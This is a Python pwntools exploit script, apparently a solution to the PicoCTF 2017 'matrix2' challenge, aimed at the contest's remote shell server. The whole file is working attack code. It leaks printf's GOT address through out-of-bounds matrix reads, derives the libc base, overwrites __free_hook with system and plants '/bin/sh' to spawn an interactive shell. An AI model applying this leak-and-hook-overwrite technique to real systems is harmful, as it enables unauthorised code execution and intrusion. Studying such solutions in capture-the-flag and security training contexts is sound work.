from pwn import *
import struct
import time
import sys

r = process("./matrix2")
b = ELF("./matrix2")
r = remote("shell2017.picoctf.com",16845)
#r = remote("127.0.0.1",1337)
libc = ELF("./libc.so.6")
#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
# socat tcp-listen:1337,fork,reuseaddr exec:"strace ./exercise-5"

"""
for x in libc.symbols:
    print x + " " + str(libc.symbols[x])
    """

def get(r,first,second):
    global NUM_MATRIX
    r.sendline("get " + str(NUM_MATRIX) + " " + str(first) + " " + str(second))

def encode(num):
    num = num/4
    first = num/10000
    second = num-first*10000
    return first, second

def parse(rec,first,second) :
    for line in rec.split("\n"):
        if " = " in line and str(first) in line and str(second) in line:
            num = line.split(" = ")[1]
            ret = struct.unpack("<I",struct.pack("<f",float(num)))[0]
            return ret

for NUM_MATRIX in range(20):
    r.sendline("create 10000 10000")
    """  leak printf """
    printf_got = b.symbols["got.printf"]
    first,second = encode(printf_got)
    get(r,first,second)
    time.sleep(1)
    rec = r.recv(1000)
    leak  = parse(rec,first,second)
    if leak!=0:
        print  str(NUM_MATRIX) + " Matrices"
        print "printf in GOT: " + hex(leak)
        break

libc_base = leak - libc.symbols["printf"]
hook = libc_base + libc.symbols["__free_hook"]
system = libc_base + libc.symbols["system"]
r.sendline("create 1 1")

""" Leak Matrices """
matrices = 0x0804B080
first,second = encode(matrices)
second += NUM_MATRIX
get(r,first,second)
time.sleep(1)
rec = r.recv(1000)
rec = parse(rec,first,second)
first_matrix = rec

print "Pointer to first matrix: " + hex(first_matrix)

first,second = encode(matrices)
second+=(1+NUM_MATRIX)
get(r,first,second)
time.sleep(1)
rec = r.recv(1000)
rec = parse(rec,first,second)
second_matrix = rec

print "Pointer to second matrix: " + hex(second_matrix)

""" set first matrix to 1mil """
first,second = encode(first_matrix)
r.sendline("set " + str(NUM_MATRIX) + " " + str(first) + " " + str(second) + " " +  str(struct.unpack("<f",struct.pack("<I",1000000))[0]))

""" Overwrite free hook with system """
first,second = encode(hook)
r.sendline("set " + str(NUM_MATRIX) + " " + str(first) + " " + str(second) + " "  + str(struct.unpack("<f",struct.pack("<I",system))[0]))

""" Overwrite N+1th struct with /bin/sh"""
first,second = encode(second_matrix)
print struct.unpack("<f","/bin")
r.sendline("set " + str(NUM_MATRIX) + " " + str(first) + " " + str(second) + " "  + str(struct.unpack("<f","/bin")[0]))
r.sendline("set " + str(NUM_MATRIX) + " " + str(first) + " " + str(second + 1) + " "  + str(struct.unpack("<f","/sh\x00")[0]))
raw_input("GDB?")

r.interactive()


